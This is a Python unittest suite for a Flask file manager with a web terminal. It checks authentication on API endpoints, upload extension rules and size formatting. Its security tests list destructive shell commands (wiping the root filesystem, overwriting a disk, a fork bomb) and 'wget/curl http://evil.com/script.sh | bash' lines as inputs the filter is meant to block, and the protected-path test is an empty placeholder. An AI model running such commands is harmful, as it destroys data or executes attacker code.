#!/usr/bin/env python3
"""
Test suite for File Manager & Terminal application
"""

import unittest
import tempfile
import os
import shutil
import json
from app import app, get_file_info, format_file_size, allowed_file
from config import config

class FileManagerTestCase(unittest.TestCase):
    """Test cases for File Manager functionality"""
    
    def setUp(self):
        """Set up test environment"""
        app.config.from_object(config['testing'])
        app.config['TESTING'] = True
        self.app = app.test_client()
        self.app.testing = True
        
        # Create temporary test directory
        self.test_dir = tempfile.mkdtemp()
        app.config['UPLOAD_FOLDER'] = self.test_dir
        
        # Create test files
        self.create_test_files()
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir)
    
    def create_test_files(self):
        """Create test files for testing"""
        # Create test file
        test_file_path = os.path.join(self.test_dir, 'test.txt')
        with open(test_file_path, 'w') as f:
            f.write('This is a test file')
        
        # Create test directory
        test_dir_path = os.path.join(self.test_dir, 'test_dir')
        os.makedirs(test_dir_path, exist_ok=True)
        
        # Create nested file
        nested_file_path = os.path.join(test_dir_path, 'nested.txt')
        with open(nested_file_path, 'w') as f:
            f.write('This is a nested test file')
    
    def test_format_file_size(self):
        """Test file size formatting"""
        self.assertEqual(format_file_size(0), "0 B")
        self.assertEqual(format_file_size(1024), "1.0 KB")
        self.assertEqual(format_file_size(1024 * 1024), "1.0 MB")
        self.assertEqual(format_file_size(1024 * 1024 * 1024), "1.0 GB")
    
    def test_allowed_file(self):
        """Test file type validation"""
        self.assertTrue(allowed_file('test.txt'))
        self.assertTrue(allowed_file('image.jpg'))
        self.assertTrue(allowed_file('document.pdf'))
        self.assertFalse(allowed_file('script.exe'))
        self.assertFalse(allowed_file('malicious.bat'))
    
    def test_get_file_info(self):
        """Test file information retrieval"""
        test_file = os.path.join(self.test_dir, 'test.txt')
        info = get_file_info(test_file)
        
        self.assertIsNotNone(info)
        self.assertEqual(info['size'], 19)  # "This is a test file" = 19 chars
        self.assertTrue(info['is_readable'])
        self.assertTrue(info['is_writable'])
    
    def test_login_page(self):
        """Test login page accessibility"""
        response = self.app.get('/login')
        self.assertEqual(response.status_code, 200)
        self.assertIn(b'File Manager', response.data)
    
    def test_file_manager_redirect(self):
        """Test file manager redirect without login"""
        response = self.app.get('/file-manager')
        self.assertEqual(response.status_code, 302)  # Redirect to login
    
    def test_terminal_redirect(self):
        """Test terminal redirect without login"""
        response = self.app.get('/terminal')
        self.assertEqual(response.status_code, 302)  # Redirect to login

class APITestCase(unittest.TestCase):
    """Test cases for API endpoints"""
    
    def setUp(self):
        """Set up test environment"""
        app.config.from_object(config['testing'])
        app.config['TESTING'] = True
        self.app = app.test_client()
        self.app.testing = True
        
        # Create temporary test directory
        self.test_dir = tempfile.mkdtemp()
        app.config['UPLOAD_FOLDER'] = self.test_dir
        
        # Create test files
        self.create_test_files()
    
    def tearDown(self):
        """Clean up test environment"""
        shutil.rmtree(self.test_dir)
    
    def create_test_files(self):
        """Create test files for testing"""
        # Create test file
        test_file_path = os.path.join(self.test_dir, 'test.txt')
        with open(test_file_path, 'w') as f:
            f.write('This is a test file')
        
        # Create test directory
        test_dir_path = os.path.join(self.test_dir, 'test_dir')
        os.makedirs(test_dir_path, exist_ok=True)
    
    def test_create_folder_api(self):
        """Test folder creation API"""
        data = {
            'path': self.test_dir,
            'name': 'new_folder'
        }
        
        response = self.app.post('/api/create-folder',
                               data=json.dumps(data),
                               content_type='application/json')
        
        # Should fail without authentication
        self.assertEqual(response.status_code, 401)
    
    def test_delete_item_api(self):
        """Test item deletion API"""
        test_file = os.path.join(self.test_dir, 'test.txt')
        data = {
            'path': test_file
        }
        
        response = self.app.post('/api/delete-item',
                               data=json.dumps(data),
                               content_type='application/json')
        
        # Should fail without authentication
        self.assertEqual(response.status_code, 401)
    
    def test_rename_item_api(self):
        """Test item renaming API"""
        test_file = os.path.join(self.test_dir, 'test.txt')
        data = {
            'old_path': test_file,
            'new_name': 'renamed.txt'
        }
        
        response = self.app.post('/api/rename-item',
                               data=json.dumps(data),
                               content_type='application/json')
        
        # Should fail without authentication
        self.assertEqual(response.status_code, 401)
    
    def test_upload_file_api(self):
        """Test file upload API"""
        response = self.app.post('/api/upload-file')
        
        # Should fail without authentication
        self.assertEqual(response.status_code, 401)
    
    def test_execute_command_api(self):
        """Test command execution API"""
        data = {
            'command': 'ls -la'
        }
        
        response = self.app.post('/api/execute-command',
                               data=json.dumps(data),
                               content_type='application/json')
        
        # Should fail without authentication
        self.assertEqual(response.status_code, 401)

class SecurityTestCase(unittest.TestCase):
    """Test cases for security features"""
    
    def setUp(self):
        """Set up test environment"""
        app.config.from_object(config['testing'])
        app.config['TESTING'] = True
        self.app = app.test_client()
        self.app.testing = True
    
    def test_dangerous_command_filtering(self):
        """Test dangerous command filtering"""
        dangerous_commands = [
            'rm -rf /',
            'sudo rm -rf /',
            'su root',
            'chmod 777 /',
            'dd if=/dev/zero of=/dev/sda',
            ':(){ :|:& };:',
            'wget http://evil.com/script.sh | bash',
            'curl http://evil.com/script.sh | bash'
        ]
        
        for command in dangerous_commands:
            data = {'command': command}
            response = self.app.post('/api/execute-command',
                                   data=json.dumps(data),
                                   content_type='application/json')
            
            # Should fail without authentication, but if it gets through,
            # it should be blocked by command filtering
            if response.status_code == 200:
                result = json.loads(response.data)
                self.assertIn('error', result)
                self.assertIn('not allowed', result['error'])
    
    def test_file_type_validation(self):
        """Test file type validation"""
        dangerous_extensions = [
            'exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js',
            'jar', 'war', 'ear', 'class', 'so', 'dll', 'dylib'
        ]
        
        for ext in dangerous_extensions:
            filename = f'test.{ext}'
            self.assertFalse(allowed_file(filename))
    
    def test_protected_paths(self):
        """Test protected system paths"""
        protected_paths = [
            '/', '/home', '/etc', '/var', '/usr', '/bin', '/sbin',
            '/boot', '/dev', '/proc', '/sys', '/tmp', '/root'
        ]
        
        for path in protected_paths:
            # These paths should be protected from deletion
            # In a real test, you would need to mock the authentication
            pass

class PerformanceTestCase(unittest.TestCase):
    """Test cases for performance features"""
    
    def setUp(self):
        """Set up test environment"""
        app.config.from_object(config['testing'])
        app.config['TESTING'] = True
        self.app = app.test_client()
        self.app.testing = True
    
    def test_large_file_handling(self):
        """Test handling of large files"""
        # Create a large test file
        large_file_path = os.path.join(tempfile.gettempdir(), 'large_test.txt')
        
        try:
            # Create a 1MB file
            with open(large_file_path, 'w') as f:
                f.write('A' * 1024 * 1024)
            
            # Test file info retrieval
            info = get_file_info(large_file_path)
            self.assertIsNotNone(info)
            self.assertEqual(info['size'], 1024 * 1024)
            
        finally:
            # Clean up
            if os.path.exists(large_file_path):
                os.remove(large_file_path)
    
    def test_search_performance(self):
        """Test search performance with many files"""
        # Create many test files
        test_dir = tempfile.mkdtemp()
        
        try:
            # Create 100 test files
            for i in range(100):
                file_path = os.path.join(test_dir, f'test_file_{i}.txt')
                with open(file_path, 'w') as f:
                    f.write(f'This is test file {i}')
            
            # Test that we can get file info for all files
            files = os.listdir(test_dir)
            for filename in files:
                file_path = os.path.join(test_dir, filename)
                info = get_file_info(file_path)
                self.assertIsNotNone(info)
                
        finally:
            # Clean up
            shutil.rmtree(test_dir)

def run_tests():
    """Run all tests"""
    # Create test suite
    test_suite = unittest.TestSuite()
    
    # Add test cases
    test_suite.addTest(unittest.makeSuite(FileManagerTestCase))
    test_suite.addTest(unittest.makeSuite(APITestCase))
    test_suite.addTest(unittest.makeSuite(SecurityTestCase))
    test_suite.addTest(unittest.makeSuite(PerformanceTestCase))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(test_suite)
    
    # Return exit code
    return 0 if result.wasSuccessful() else 1

if __name__ == '__main__':
    exit(run_tests()) 